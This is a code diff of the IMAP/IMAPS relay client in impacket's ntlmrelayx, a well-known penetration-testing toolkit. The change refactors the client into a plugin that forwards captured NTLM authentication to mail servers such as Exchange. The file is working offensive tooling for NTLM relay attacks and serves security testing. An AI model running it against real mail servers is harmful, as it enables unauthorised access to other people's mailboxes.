@@ -5,8 +5,11 @@
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
+# IMAP Protocol Client
+#
 # Author:
 #   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
+#   Alberto Solino (@agsolino)
 #
 # Description: 
 # IMAP client for relaying NTLMSSP authentication to mailservers, for example Exchange
@@ -14,54 +17,69 @@
 import logging
 import imaplib
 import base64
+from struct import unpack
 
-class IMAPRelayClient:
-    def __init__(self, target):
-        # Target comes as protocol://target:port
-        self.target = target
-        proto, host, port = target.split(':')
-        host = host[2:]
-        if int(port) == 993 or proto.upper() == 'IMAPS':
-            self.session = imaplib.IMAP4_SSL(host,int(port))
-        else:
-            #assume non-ssl IMAP
-            self.session = imaplib.IMAP4(host,port)
+from impacket import LOG
+from impacket.examples.ntlmrelayx.clients import ProtocolClient
+from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
+from impacket.ntlm import NTLMAuthChallenge
+from impacket.spnego import SPNEGO_NegTokenResp
+
+PROTOCOL_CLIENT_CLASSES = ["IMAPRelayClient","IMAPSRelayClient"]
+
+class IMAPRelayClient(ProtocolClient):
+    PLUGIN_NAME = "IMAP"
+
+    def initConnection(self):
+        self.session = imaplib.IMAP4(self.targetHost,self.targetPort)
+        self.authTag = self.session._new_tag()
         if 'AUTH=NTLM' not in self.session.capabilities:
-            logging.error('IMAP server does not support NTLM authentication!')
+            LOG.error('IMAP server does not support NTLM authentication!')
             return False
-        self.authtag = self.session._new_tag()
-        self.lastresult = None
+        return True
 
     def sendNegotiate(self,negotiateMessage):
-        #Negotiate auth
         negotiate = base64.b64encode(negotiateMessage)
-        self.session.send('%s AUTHENTICATE NTLM%s' % (self.authtag,imaplib.CRLF))
+        self.session.send('%s AUTHENTICATE NTLM%s' % (self.authTag,imaplib.CRLF))
         resp = self.session.readline().strip()
         if resp != '+':
-            logging.error('IMAP Client error, expected continuation (+), got %s ' % resp)
+            LOG.error('IMAP Client error, expected continuation (+), got %s ' % resp)
             return False
         else:
             self.session.send(negotiate + imaplib.CRLF)
         try:
             serverChallengeBase64 = self.session.readline().strip()[2:] #first two chars are the continuation and space char
             serverChallenge = base64.b64decode(serverChallengeBase64)
-            return serverChallenge
+            challenge = NTLMAuthChallenge()
+            challenge.fromString(serverChallenge)
+            return challenge
         except (IndexError, KeyError, AttributeError):
-            logging.error('No NTLM challenge returned from IMAP server')
+            LOG.error('No NTLM challenge returned from IMAP server')
+            raise
 
-    def sendAuth(self,authenticateMessageBlob, serverChallenge=None):
-        #Send auth
-        auth = base64.b64encode(authenticateMessageBlob)
+    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+            token = respToken2['ResponseToken']
+        else:
+            token = authenticateMessageBlob
+        auth = base64.b64encode(token)
         self.session.send(auth + imaplib.CRLF)
-        typ, data = self.session._get_tagged_response(self.authtag)
+        typ, data = self.session._get_tagged_response(self.authTag)
         if typ == 'OK':
             self.session.state = 'AUTH'
-            return True
+            return None, STATUS_SUCCESS
         else:
-            logging.info('Auth failed - IMAP server said: %s' % ' '.join(data))
-            return False
+            LOG.error('IMAP: %s' % ' '.join(data))
+            return None, STATUS_ACCESS_DENIED
 
-    #SMB Relay server needs this
-    @staticmethod
-    def get_encryption_key():
-        return None
+class IMAPSRelayClient(IMAPRelayClient):
+    PLUGIN_NAME = "IMAPS"
+
+    def initConnection(self):
+        self.session = imaplib.IMAP4_SSL(self.targetHost,self.targetPort)
+        self.authTag = self.session._new_tag()
+        if 'AUTH=NTLM' not in self.session.capabilities:
+            LOG.error('IMAP server does not support NTLM authentication!')
+            return False
+        return True
